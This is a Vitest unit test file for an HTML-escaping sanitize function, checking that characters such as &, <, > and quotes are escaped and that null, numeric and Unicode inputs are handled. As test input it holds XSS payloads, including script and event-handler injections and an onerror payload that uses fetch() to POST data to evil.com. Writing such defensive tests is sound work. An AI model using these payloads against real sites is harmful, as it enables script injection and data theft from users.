import { describe, it, expect } from 'vitest';
import { sanitize } from '../../../../src/js/modules/sanitize.js';

describe('Sanitize Module', () => {
  describe('sanitize Function', () => {
    // Test individual character escaping
    it('should escape ampersand (&) to &amp;', () => {
      const result = sanitize('Tom & Jerry');
      expect(result).toBe('Tom &amp; Jerry');
    });

    it('should escape less-than (<) to &lt;', () => {
      const result = sanitize('A < B');
      expect(result).toBe('A &lt; B');
    });

    it('should escape greater-than (>) to &gt;', () => {
      const result = sanitize('A > B');
      expect(result).toBe('A &gt; B');
    });

    it('should escape double quote (") to &quot;', () => {
      const result = sanitize('He said "hello"');
      expect(result).toBe('He said &quot;hello&quot;');
    });

    it('should escape single quote (\') to &#039;', () => {
      const result = sanitize("It's mine");
      expect(result).toBe('It&#039;s mine');
    });

    // Test XSS attack vectors
    it('should escape script tags', () => {
      const result = sanitize("<script>alert('xss')</script>");
      expect(result).toBe("&lt;script&gt;alert(&#039;xss&#039;)&lt;/script&gt;");
      expect(result).not.toContain('<script>');
    });

    it('should escape inline event handlers', () => {
      const result = sanitize('<img src="x" onerror="alert(\'xss\')"');
      expect(result).toBe('&lt;img src=&quot;x&quot; onerror=&quot;alert(&#039;xss&#039;)&quot;');
      expect(result).not.toContain('onerror="');
      expect(result).toContain('&lt;img');
    });

    it('should escape iframe tags', () => {
      const result = sanitize('<iframe src="evil.com"></iframe>');
      expect(result).toBe('&lt;iframe src=&quot;evil.com&quot;&gt;&lt;/iframe&gt;');
      expect(result).not.toContain('<iframe');
      expect(result).toContain('&lt;iframe');
    });

    // Test null and undefined
    it('should convert null to empty string', () => {
      const result = sanitize(null);
      expect(result).toBe('');
    });

    it('should convert undefined to empty string', () => {
      const result = sanitize(undefined);
      expect(result).toBe('');
    });

    // Test non-string types
    it('should convert number to string', () => {
      const result = sanitize(123);
      expect(result).toBe('123');
    });

    it('should convert boolean to string', () => {
      const result = sanitize(true);
      expect(result).toBe('true');
    });

    // Test multiple occurrences
    it('should escape multiple occurrences of same character', () => {
      const result = sanitize('&&&');
      expect(result).toBe('&amp;&amp;&amp;');
    });

    it('should escape multiple different characters', () => {
      const result = sanitize('<tag> & "attr" = \'value\'');
      expect(result).toBe('&lt;tag&gt; &amp; &quot;attr&quot; = &#039;value&#039;');
    });

    // Test HTML entities are escaped to safe entities
    it('should properly escape HTML-like strings', () => {
      const result = sanitize('<div class="container">Content</div>');
      expect(result).toBe('&lt;div class=&quot;container&quot;&gt;Content&lt;/div&gt;');
      expect(result).not.toContain('<div');
    });

    // Test order of escaping (ampersand first)
    it('should escape ampersand first to avoid double-escaping', () => {
      const result = sanitize('&lt;');
      // & is escaped to &amp;, then < is escaped to &lt;
      // Result should be &amp;lt; (not &amp;amp;lt;)
      expect(result).toBe('&amp;lt;');
    });

    // Test empty string
    it('should handle empty string', () => {
      const result = sanitize('');
      expect(result).toBe('');
    });

    // Test whitespace and special characters
    it('should preserve whitespace', () => {
      const result = sanitize('hello   world\n\t');
      expect(result).toBe('hello   world\n\t');
    });

    it('should escape complex XSS payload', () => {
      const xssPayload = '<img src=x onerror="fetch(\'http://evil.com\', {method: \'POST\', body: \'data\'});">';
      const result = sanitize(xssPayload);
      expect(result).not.toContain('<img');
      expect(result).not.toContain('onerror="');
      expect(result).toContain('&lt;img');
      expect(result).toContain('&quot;');
      expect(result).toContain('&#039;');
    });


    // Test Unicode characters
    it('should preserve Unicode characters while escaping HTML', () => {
      const result = sanitize('Hello 世界 <tag>');
      expect(result).toBe('Hello 世界 &lt;tag&gt;');
    });

    // Test that result is always a string
    it('should always return a string', () => {
      expect(typeof sanitize('text')).toBe('string');
      expect(typeof sanitize(123)).toBe('string');
      expect(typeof sanitize(null)).toBe('string');
      expect(typeof sanitize(undefined)).toBe('string');
    });

    // Test mixed content
    it('should handle mixed safe and unsafe content', () => {
      const result = sanitize('Hello <world>, this & that "quoted" \'single\'');
      expect(result).toBe('Hello &lt;world&gt;, this &amp; that &quot;quoted&quot; &#039;single&#039;');
    });

    // Test array-like and object-like inputs (should convert to string)
    it('should convert array to string representation', () => {
      const result = sanitize([1, 2, 3]);
      expect(typeof result).toBe('string');
      expect(result.length).toBeGreaterThan(0);
    });

    it('should handle all OWASP top XSS vectors', () => {
      const vectors = [
        '<img src=x>',
        '<svg onload=alert("xss")>',
        '<iframe src="javascript:alert(\'xss\')">',
        '<body onload=alert("xss")>',
      ];

      for (const vector of vectors) {
        const result = sanitize(vector);
        expect(result).not.toContain('<');
        expect(result).not.toContain('>');
        expect(result).toContain('&lt;');
      }

      // Test javascript: protocol separately
      const jsVector = 'javascript:alert("xss")';
      const result = sanitize(jsVector);
      expect(result).toContain('javascript:alert(&quot;xss&quot;)');
      expect(result).not.toContain('<');
    });
  });
});
